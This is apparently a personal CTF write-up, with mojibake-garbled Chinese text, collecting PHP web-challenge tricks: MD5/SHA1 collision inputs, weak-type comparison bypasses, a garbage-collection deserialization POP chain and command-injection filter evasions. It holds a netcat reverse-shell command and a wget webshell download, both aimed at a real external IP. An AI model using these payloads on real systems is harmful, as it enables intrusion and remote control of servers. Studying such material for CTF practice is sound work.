[{"id":"a9e106cab2b5b4ec4cb305a164f518b5","title":"èµ›äº‹æ€»ç»“","content":"Ctfç»éªŒåŠå…¶é¢˜ç›®æ€»ç»“l åšé¢˜ç»éªŒï¼šä¸è¦å¿½ç•¥index.php** å’ŒæŸ¥çœ‹æºä»£ç  \nl robots.txt\nl Sqlå…ˆæµ‹é—­åˆå’Œå’Œæ³¨é‡Šç¬¦\nMD5å„å§¿åŠ¿ç»•è¿‡1.åˆ¤æ–­æ˜¯å¦ä¸ºMD5çš„å…³é”®å­—ffifdyop \nâ€‹                               \n2.MD5æ¯”è¾ƒ ï¼ˆåŒ&#x3D;&#x3D;ï¼‰l md5_1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&amp;md5_2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\nl $a&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\n$b&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\n3ï¼š$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)â€‹    æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ»¡è¶³ a ä¸ç­‰äº b ä½†æ˜¯ a å’Œ b è¿›è¡Œ md5 åçš„æ•°å€¼éœ€è¦ç›¸ç­‰\nâ€‹    å¯ä»¥è®©a &#x3D;QNKCDZO b&#x3D;&#x3D;240610708  s878926199a  s155964671a QLTHNDT\nQNKCDZO å’Œ 240610708 è¿›è¡Œ md5 ååŠ å¯†çš„æ•°å€¼ä¸º 0eå¼€å¤´ï¼Œåœ¨ PHP ä¸­ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€æœ‰ 0e å¼€å¤´çš„æ•°æ®è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒçš†ä¸º True \nâ€‹    æˆ–è€…a[]&#x3D;1&amp;b[]&#x3D;1,md5æ— æ³•è¿›è¡Œæ•°ç»„æ¯”è¾ƒ å³å¯ç»•è¿‡ \n4ï¼š&#x3D;&#x3D;&#x3D;å¼ºç±»å‹æ¯”è¾ƒ $_POST``[``&#39;param1&#39;``]!==``$_POST``[``&#39;param2&#39;``]&amp;&amp;``md5``(``$_POST``[``&#39;param1&#39;``])===``md5``(``$_POST``[``&#39;param2&#39;``]\nÂ·Â·       ä»å¯ç”¨æ•°ç»„è¿›è¡Œæ¯”è¾ƒparam1[]&#x3D;1&amp;param2[]&#x3D;2\nâ€‹    Or\nâ€‹    array1&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\n&amp;\narray2&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab\nor\nâ€‹    a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\n&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\nSha1\narray1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1\n5.md5($a) &#x3D;&#x3D; md5(md5($b)mdå’Œmd5åéƒ½æ˜¯ä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼š\nwSfHENKtYMLp9dlXrjTf&#x3D;&gt;0e831574571239196549417613222648\nDZScqjlajV0mrWZl6YUw&#x3D;&gt;0e328945755880883750704598784448\n4.$a&#x3D;&#x3D;md5($a)10e215962017\n\nphp å¼±ç±»å‹æ€»ç»“md5ä¸Šæ–‡å·²æ€»ç»“\njson ç»•è¿‡123456789101112131415&lt;?phpif (isset($_POST[&#x27;message&#x27;])) &#123;    $message = json_decode($_POST[&#x27;message&#x27;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) &#123;        echo &quot;flag&quot;;    &#125;     else &#123;        echo &quot;fail&quot;;    &#125; &#125; else&#123;     echo &quot;~~~~&quot;; &#125;?&gt;\n\n\nåˆ†æï¼šè¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº $keyçš„å€¼ï¼Œä½†æ˜¯$keyçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨0&#x3D;&#x3D;â€adminâ€è¿™ç§å½¢å¼ç»•è¿‡\næœ€ç»ˆpayload message&#x3D;{â€œkeyâ€:0}                      \narray_searchï¼ˆï¼‰ ç»•è¿‡1234567891011121314151617 1 &lt;?php 2 if(!is_array($_GET[&#x27;test&#x27;]))&#123;exit();&#125; 3 $test=$_GET[&#x27;test&#x27;]; 4 for($i=0;$i&lt;count($test);$i++)&#123; 5     if($test[$i]===&quot;admin&quot;)&#123; 6         echo &quot;error&quot;; 7         exit(); 8     &#125; 9     $test[$i]=intval($test[$i]);10 &#125;11 if(array_search(&quot;admin&quot;,$test)===0)&#123;12     echo &quot;flag&quot;;13 &#125;14 else&#123;15     echo &quot;false&quot;;16 &#125;17 ?&gt;\n\nåˆ†æï¼šä¸Šé¢æ˜¯è‡ªå·±å†™çš„ä¸€ä¸ªï¼Œå…ˆåˆ¤æ–­ä¼ å…¥çš„æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œ\nç„¶åå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ï¼Œå¹¶ä¸”æ•°ç»„ä¸­çš„æ¯ä¸ªé”®å€¼ä¸èƒ½å’Œadminç›¸ç­‰ï¼Œ\nå¹¶ä¸”å°†æ¯ä¸ªå€¼è½¬åŒ–ä¸ºintç±»å‹ï¼Œ\nå†åˆ¤æ–­ä¼ å…¥çš„æ•°ç»„æ˜¯å¦æœ‰â€œadminâ€ï¼Œæœ‰åˆ™è¿”å›flag\npayload\n test&#x3D;[0]\narray_search() å‡½æ•°ä¸ in_array() ä¸€æ ·ï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸€ä¸ªé”®å€¼ã€‚å¦‚æœæ‰¾åˆ°äº†è¯¥å€¼ï¼Œåˆ™è¿”å›åŒ¹é…è¯¥å…ƒç´ æ‰€å¯¹åº”çš„é”®åã€‚å¦‚æœæ²¡æ‰¾åˆ°ï¼Œåˆ™è¿”å› false\nåŸå› ï¼šarray_serch()  åœ¨åˆ¤æ–­æ•°ç»„é‡Œé¢æœ‰æ²¡æœ‰ é”®å€¼ä¸  å­—ç¬¦ä¸²â€œadminâ€ç›¸ç­‰ çš„   ç”¨çš„æ˜¯ &#x3D;&#x3D;  ï¼Œæ ¹æ®phpå¼±ç±»å‹ï¼Œå­—ç¬¦ä¸²admin çš„å€¼ä¸º 0  ï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ªå«æœ‰0ç´¢å¼•ä½ç½®çš„é”®å€¼ä¸º0 çš„æ•°ç»„ test å°±å¯ä»¥æˆåŠŸç»•è¿‡\nstrcmpï¼ˆï¼‰ç»•è¿‡12345678910111 &lt;?php 2     $password=&quot;***************&quot; 3      if(isset($_POST[&#x27;password&#x27;]))&#123; 4  5         if (strcmp($_POST[&#x27;password&#x27;], $password) == 0) &#123; 6             echo &quot;Right!!!login success&quot;;n 7             exit(); 8         &#125; else &#123; 9             echo &quot;Wrong password..&quot;;10         &#125;11 ?&gt;\n\n\nåˆ†æï¼šstrcmpæ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœstr1&lt;str2 åˆ™è¿”å›å€¼&lt;0 ï¼Œå¦‚æœstr1å¤§äºstr2è¿”å›&gt;0 ï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰ è¿”å›0\næˆ‘ä»¬æ˜¯ä¸çŸ¥é“$passwordçš„å€¼çš„ï¼Œé¢˜ç›®è¦æ±‚strcmpåˆ¤æ–­çš„æ¥å—çš„å€¼å’Œ$passwordå¿…éœ€ç›¸ç­‰ï¼Œstrcmpä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯ä¸ªæ•°ç»„ä¼šæ€ä¹ˆæ ·å‘¢\næˆ‘ä»¬ä¼ å…¥ password[]&#x3D;xxx å¯ä»¥ç»•è¿‡ æ˜¯å› ä¸ºå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯åˆ¤æ–­å…¶ç›¸ç­‰\npayload: password[]&#x3D;xxx\nswitchï¼ˆï¼‰ç»•è¿‡12345678910111213141516171819201 &lt;?php 2 $a=&quot;4admin&quot;; 3 switch ($a) &#123; 4     case 1: 5         echo &quot;fail1&quot;; 6         break; 7     case 2: 8         echo &quot;fail2&quot;; 9         break;10     case 3:11         echo &quot;fail3&quot;;12         break;13     case 4:14         echo &quot;sucess&quot;;  //ç»“æœè¾“å‡ºsuccess;15         break;16     default:17         echo &quot;failall&quot;;18         break;19 &#125;20 ?&gt;\n\nåˆ†æ ï¼š åœ¨è¿›è¡Œswitch é€‰æ‹©æ—¶ $aä¼šè¢«å¼ºåˆ¶è½¬æ¢æˆæ•´å½¢è¿›è¡Œå¯¹ç…§æ‰€ä»¥ ä»¤$a&#x3D;â€4asdfsâ€ &#x3D;intï¼ˆ4ï¼‰æˆåŠŸè¿›è¡Œç»•è¿‡\næˆä¹Ÿå¸ƒå°”ï¼Œè´¥ä¹Ÿå¸ƒå°”æˆä¹Ÿå¸ƒå°”ï¼Œè´¥ä¹Ÿå¸ƒå°”â€˜ï¼Œå¸ƒå°”ç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²åœ¨â€˜&#x3D;&#x3D;â€™ä¸‹æˆç«‹\nintvalç»•è¿‡ https://www.nssctf.cn/problem/2076 \n                          \n123é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ value çš„ int æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_WARNING é”™è¯¯å¹¶è¿”å› 1ã€‚ echo intval(array());                 // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1\n\nä¼ å…¥æ•°ç»„å°±èƒ½ç»•è¿‡a[]&#x3D;1 \nlinux rceç©ºæ ¼ç»•è¿‡${IFS}&#x2F;$IFS\n \nç©ºæ ¼æ›¿ä»£ eg:cat &#x2F;1.php &#x3D;&#x3D; cat${IFS}&#x2F;1.php\n&#x3D;çš„å¹³æ›¿like;ç©ºæ ¼çš„å¹³æ›¿ï¼š&#x2F;**&#x2F;, %20, %0a(æ¢è¡Œ),%a0,(),+;\n8ï¼špreg_matchç»•è¿‡ \n1ï¼šé•¿åº¦ç»•è¿‡ æ±¡æŸ“å‚æ•°ï¼Œåœ¨è¦ä¼ æ‰€éœ€å‚æ•°å‰ä¼ ä¸€ä¸ªæ— å…³å‚æ•°\nEg:æ‰€éœ€å‚æ•°æ˜¯cmd ä¼ å‚æ˜¯å¯ä»¥  a&#x3D;aaaaaaaaaaaaaaaaaaaaaaaaaa**&amp;cmd&#x3D;xxxxxxxx** æ ‡è®°éƒ¨åˆ†ä¸ºå‚æ•°æ±¡æŸ“éƒ¨åˆ†\n2ï¼š[  ç©ºæ ¼ + . è¿™å››ä¸ªéƒ½å¯ä»¥è¢«å¤„ç†ä¸º**_**\n9ï¼šæ­£åˆ™ç»•è¿‡åŠbasename()å‡½æ•° https://www.nssctf.cn/problem/463\nè¯¦è§£ https://www.cnblogs.com/FPointzero/p/16438478.html\n1ï¼šbasename()ï¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚ä½†æ˜¯å®ƒæœ‰ä¸ªå°é—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶å\nå¼€å¤´çš„é ASCII å€¼ã€‚\nä¾‹å­ï¼š 127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php æ˜¾ç¤ºï¼š1.php\n127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;flag.php&#x2F;1.php æ˜¾ç¤ºï¼š1.php\n2ï¼šSERVER[â€²REQUESTURIâ€²]ï¼šä¸ _SERVER[â€˜PHP_SELFâ€™]çš„åŒºåˆ«æ˜¯ä¼šåŠ ä¸Šå‚æ•°\nä¾‹å­ï¼š\n127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php æ˜¾ç¤ºï¼š&#x2F;pikachu&#x2F;index.php?1.php\n3ï¼š$_SERVER[â€˜PHP_SELFâ€™] ï¼šæ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å\nä¾‹å­ï¼š\n127.0.0.1&#x2F;pikachu&#x2F;index.php æ˜¾ç¤ºï¼š&#x2F;pikachu&#x2F;index.php\n4ï¼šbasename()ç»•è¿‡ æ·»åŠ éasciiç¼–ç å­—ç¬¦ egï¼šæ±‰å­— %a0ç­‰\n5ï¼špreg_matchä¸­show_sourceç»•è¿‡ æ›¿æ¢æˆ show[source, show source, show+source, show.source\n10: show_souerce\nåœ¨ URL ä¸­ä½¿ç”¨ show_source æ˜¯ä¸€ç§ PHP æä¾›çš„ç‰¹æ®ŠåŠŸèƒ½ï¼Œç”¨äºæŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„æºä»£ç ã€‚å½“åœ¨ URL ä¸­æ·»åŠ  show_source&#x3D;æ–‡ä»¶è·¯å¾„æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›è¯¥æ–‡ä»¶çš„æºä»£ç è€Œä¸æ˜¯æ‰§è¡Œå®ƒã€‚\nXYCTFå¤ç°ç½‘ç«™ https://gz.imxbt.cn\nezpophttps://developer.aliyun.com/article/1161068\nhttps://blog.csdn.net/qq_45619909/article/details/122803600\nGCï¼ˆåƒåœ¾å›æ”¶ï¼‰åœ¨PHPä¸­ï¼Œä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸ºNULLï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘\næ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰\nzvalçš„å˜é‡å®¹å™¨\n\n12345678&lt;?php$a=&quot;new string&quot;;$b =&amp;$a;$c =&amp;$b;xdebug_debug_zval(&#x27;a&#x27;);unset($b,$c);xdebug_debug_zval(&#x27;a&#x27;);?&gt;\n\nå¼•ç”¨$açš„å˜é‡$bå’Œ$céƒ½è¢«unsetäº†ï¼Œæ‰€ä»¥è¿™é‡Œçš„is_refåº”è¯¥æ˜¯falseï¼Œä¹Ÿæ˜¯å› ä¸ºunsetï¼Œè¿™é‡Œçš„refcountåº”è¯¥ä»3å˜æˆäº†1ï¼Œæ¥ä¸‹æ¥éªŒè¯ä¸€ä¸‹\n\nCGä¸ååºåˆ—åŒ–çš„åˆ©ç”¨__destructï¼ˆææ„å‡½æ•°ï¼‰å½“æŸä¸ªå¯¹è±¡æˆä¸ºåƒåœ¾æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œé”€æ¯\næ‰§è¡Œ__destructæ–¹æ³•ï¼Œå°±å¾—ç»•è¿‡è¿™ä¸ªthrow new Exceptionã€‚å› ä¸º__destructæ–¹æ³•æ˜¯åœ¨è¯¥å¯¹è±¡è¢«å›æ”¶æ—¶è°ƒç”¨ï¼Œè€Œexceptionä¼šä¸­æ–­è¯¥è¿›ç¨‹å¯¹è¯¥å¯¹è±¡çš„é”€æ¯\n\na:2:{i:0;O:1:â€Bâ€:0:{}i:1;i:0;}\næ”¹ä¸º\na:2:{i:0;O:1:â€Bâ€:0:{}i:0;i:0;}\nå³å¯è§¦å‘GC\nå‘ç°åªè¦ç´¢å¼•ç›¸åŒï¼Œå³å¯ç»•è¿‡å¼‚å¸¸æŠ›å‡º\na:{i:1;O:1:â€Bâ€:0:{}i:1;i:0;}\nå…·ä½“äº†è§£ åŒé€’å‡æ¼æ´\næ¼æ´æŠ¥å‘Šå¦‚ä¸‹ï¼ˆCVE-2016-5771ï¼‰ï¼š https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771 ã€‚\nhttps://www.anquanke.com/post/id/149424\nçŸ¥é“è¿™ä¸¤è€…ï¼Œå³å¯æ”»ç ´è¯¥é¢˜ç›®\nåˆ©ç”¨PHPåƒåœ¾å›æ”¶æœºåˆ¶æ„é€ pop123456789101112131415161718192021222324&lt;?phpclass AAA&#123;    public $s;    public $a;&#125;class BBB&#123;    public $c;    public $d;&#125;class CCC&#123;    public $c;&#125;$c=new CCC();$a=new AAA();$b=new BBB;$a-&gt;s=$b;$c-&gt;c=$a;$d=array($c,1);echo serialize($d);\n\nè¾“å‡º\na:2:{i:0;O:3:â€CCCâ€:1:{s:1:â€câ€;O:3:â€AAAâ€:2:{s:1:â€sâ€;O:3:â€BBBâ€:2:{s:1:â€câ€;N;s:1:â€dâ€;N;}s:1:â€aâ€;N;}}i:1;i:1;}\nå†æ”¹ä¸º\na:2:{i:0;O:3:â€CCCâ€:1:{s:1:â€câ€;O:3:â€AAAâ€:2:{s:1:â€sâ€;O:3:â€BBBâ€:2:{s:1:â€câ€;N;s:1:â€dâ€;N;}s:1:â€aâ€;N;}}i:0;i:1;}\nå³å¯ç»•è¿‡\nåŠ¨æ€å‡½æ•°æ‰§è¡Œè¯­å¥\n\nå¯ä»¥å‘ç°åœ¨åŠ¨æ€æ‰§è¡Œå‡½æ•°è¯­å¥æ„é€ å®Œæˆä¹‹åï¼Œå†è¿½åŠ æ— å…³å‚æ•°ä¸å½±å“å‘½ä»¤æ‰§è¡Œ\n\n\n12345&lt;?php$array = [&#x27;lastname&#x27;, &#x27;email&#x27;, &#x27;phone&#x27;];var_dump(implode(&quot;,&quot;, $array)); // string(20) &quot;lastname,email,phone&quot;\n\nä¾¿å¯ä»¥å°†è¿™ä¸¤ä¸ªå‡½æ•°æ­é…ä½¿ç”¨ æ„é€ åŠ¨æ€å‡½æ•°æ‰§è¡Œè¯­å¥ï¼Œå¦‚ä¸‹æ˜¯ç›®æ ‡è¯­å¥\n\nå°†ç›®æ ‡è¯­å¥æ”¾å…¥popä¸­æ„é€ å³å¯\npopåŠæœ€ç»ˆpayload\n123456789101112131415161718192021222324&lt;?phpclass AAA&#123;    public $s;    public $a;&#125;class BBB&#123;    public $c=&#x27;cat /flag&#x27;;    public $d;&#125;class CCC&#123;    public $c;&#125;$c=new CCC();$a=new AAA();$b=new BBB;$a-&gt;s=$b;$c-&gt;c=$a;$d=array($c,0);echo serialize($d);\n\n\nç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§\næœ€åä¸€è¡Œæœ‰æ³¨é‡Šç¬¦ # æ‰€ä»¥ä¼ å…¥cmdæ—¶éœ€è¦ç”¨æ¢è¡Œç¬¦ %a0 æ¥ç»•è¿‡\næ ¹æ®ä¸Šè¾¹è¿‡æ»¤å¯çŸ¥éœ€è¦è¿›è¡ŒäºŒæ¬¡ä¼ å‚  systemè¢«è¿‡æ»¤ ç”¨ &#96; æ¥ä»£æ›¿\ncmdæ‹¼æ¥åˆ°åè¾¹çš„ mamba outæ— ç”¨éœ€è¦å…ˆé—­åˆå†æ³¨é‡Šæ‰\næ€è·¯ä¸€ åå¼¹shellpayload:\n\nps:ä¸è¦å¿˜è®°åˆ†å·é—­åˆ\n&amp;1&#x3D;nc 101.37.70.128 7878 -e &#x2F;bâ€™â€™in&#x2F;sh      bâ€™â€™inç»•è¿‡è¿‡æ»¤\nè¿›è¡Œåå¼¹shellè·å–flag\n\næ€è·¯äºŒ è¿œç¨‹ä¸‹è½½æœ¨é©¬1wget -O &lt;ä¿å­˜è·¯å¾„/æ–‡ä»¶å&gt; &lt;ä¸‹è½½é“¾æ¥&gt;\n\nç°åœ¨æ”»å‡»æœºä¸Šå‡†å¤‡ä¸€ä»½æœ¨é©¬ she\n\nç”¨pythonå¼€å¯ä¸€ä¸ªæœåŠ¡\n\nå°†è¯¥ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ä¸Š  ç”¨åˆ°npså†…ç½‘ç©¿é€ æ•ˆæœå‘ˆç°å¦‚ä¸‹\n\næ­å»ºæˆåŠŸä¹‹å è¿›è¡ŒäºŒæ¬¡ä¼ å‚å¹¶æ„é€ ä¸‹è½½æ–‡ä»¶å‘½ä»¤\npayloadï¼š\n%0a$_GET[1];%23&amp;1&#x3D;wget -O .&#x2F;she.php http://101.37.70.128:10010/she\nè®¿é—®url&#x2F;she.phpè¿æ¥èšå‰‘å³å¯\n\nezRCEç”¨å…«è¿›åˆ¶æ„é€ å‘½ä»¤\n\nå¯è§\n **$â€™\\154\\163â€™ **å’Œ ls å‘½ä»¤æ•ˆæœç›¸åŒ\nåŸç†å¦‚ä¸‹\nåœ¨Shellç¼–ç¨‹ä¸­ï¼Œls 